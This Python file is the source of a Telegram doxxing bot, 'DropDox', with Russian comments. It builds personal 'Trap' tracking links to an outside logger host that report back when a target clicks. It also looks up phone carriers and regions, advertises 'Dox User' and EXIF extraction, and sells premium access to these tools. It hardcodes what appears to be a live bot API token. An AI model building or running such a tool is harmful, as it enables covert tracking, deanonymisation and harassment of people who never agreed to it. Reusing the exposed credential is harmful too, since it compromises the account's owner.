import logging
import os
import json
import requests
import phonenumbers
from datetime import datetime, timedelta
from PIL import Image
from PIL.ExifTags import TAGS
from phonenumbers import carrier, geocoder
from aiogram import Bot, Dispatcher, executor, types

# --- [ КОНФИГУРАЦИЯ ] ---
API_TOKEN = '8504796844:AAGVerEJuDpiCiR-HxyP7t2GAfY-dFgAq3k'
OWNER_ID = 8380479728 
LOGGER_URL = "https://portfolio-myweb.up.railway.app/track"
DATA_FILE = "users_db.json"

logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)

# --- [ БАЗА ДАННЫХ ] ---
def load_db():
    if not os.path.exists(DATA_FILE):
        return {"premium": {}, "admins": [], "banned": []}
    try:
        with open(DATA_FILE, "r") as f: return json.load(f)
    except: return {"premium": {}, "admins": [], "banned": []}

def save_db(data):
    with open(DATA_FILE, "w") as f: json.dump(data, f, indent=4)

def get_role(user_id):
    if user_id == OWNER_ID: return "Owner"
    db = load_db()
    if user_id in db["banned"]: return "Banned"
    if user_id in db["admins"]: return "Admin"
    uid_str = str(user_id)
    if uid_str in db["premium"]:
        expiry = datetime.strptime(db["premium"][uid_str], "%Y-%m-%d")
        if datetime.now() <= expiry: return "Premium"
        else:
            del db["premium"][uid_str]
            save_db(db)
    return "User"

# --- [ ОБРАБОТКА КОМАНД ] ---
@dp.message_handler(commands=['start'])
async def start(m: types.Message):
    role = get_role(m.from_user.id)
    if role == "Banned": return
    kb = types.ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add("🪤 Trap", "📱 Dox Phone")
    if role in ["Premium", "Admin", "Owner"]: kb.add("👤 Dox User", "🖼 EXIF Data")
    if role in ["Owner", "Admin"]: kb.add("📊 Stats", "🚨 Panic")
    await m.answer(f"🦾 <b>DropDox v0.5.5</b>\nСтатус: <b>{role}</b>", reply_markup=kb, parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "🪤 Trap")
async def trap_handler(m: types.Message):
    uid = m.from_user.id
    role = get_role(uid)
    if role == "Banned": return

    # Создаем персональную ссылку с типом роли
    link = f"{LOGGER_URL}?owner={uid}&type={role.lower()}"
    
    text = f"🛡 <b>{role}Link:</b>\n<code>{link}</code>\n\n"
    text += "<i>Отчет придет лично тебе, когда цель перейдет по ссылке.</i>"
    await m.answer(text, parse_mode="HTML")

@dp.message_handler(commands=['give_access'])
async def access(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    try:
        args = m.get_args().split()
        target_id, days = args[0], int(args[1])
        db = load_db()
        expiry = (datetime.now() + timedelta(days=days)).strftime("%Y-%m-%d")
        db["premium"][str(target_id)] = expiry
        save_db(db)
        await m.answer(f"✅ Доступ для {target_id} выдан до {expiry}")
    except: await m.answer("Юзай: /give_access ID ДНИ")

@dp.message_handler(commands=['set_admin'])
async def set_admin(m: types.Message):
    if get_role(m.from_user.id) != "Owner": return
    try:
        uid = int(m.get_args())
        db = load_db()
        if uid not in db["admins"]: db["admins"].append(uid)
        save_db(db)
        await m.answer(f"🛠 Пользователь {uid} теперь Админ.")
    except: await m.answer("Юзай: /set_admin ID")

@dp.message_handler(lambda m: m.text == "📊 Stats")
async def show_stats(m: types.Message):
    if get_role(m.from_user.id) not in ["Owner", "Admin"]: return
    db = load_db()
    text = (f"📊 <b>Статистика:</b>\n"
            f"Премиум юзеров: {len(db['premium'])}\n"
            f"Админов: {len(db['admins'])}\n"
            f"В бане: {len(db['banned'])}")
    await m.answer(text, parse_mode="HTML")

@dp.message_handler(lambda m: m.text == "🚨 Panic")
async def panic(m: types.Message):
    if get_role(m.from_user.id) != "Owner": return
    await m.answer("🚨 СИСТЕМА ОСТАНОВЛЕНА")
    os._exit(0)

# --- [ ФУНКЦИИ ПРОБИВА (ОСТАЛЬНЫЕ) ] ---
@dp.message_handler(lambda m: m.text.startswith('+'))
async def ph(m: types.Message):
    try:
        num = phonenumbers.parse(m.text)
        info = f"📡 {carrier.name_for_number(num, 'ru')}\n🌍 {geocoder.description_for_number(num, 'ru')}"
        await m.answer(f"🔍 <b>Номер:</b>\n{info}", parse_mode="HTML")
    except: await m.answer("❌ Ошибка формата")

if __name__ == '__main__':
    executor.start_polling(dp, skip_updates=True)
                    
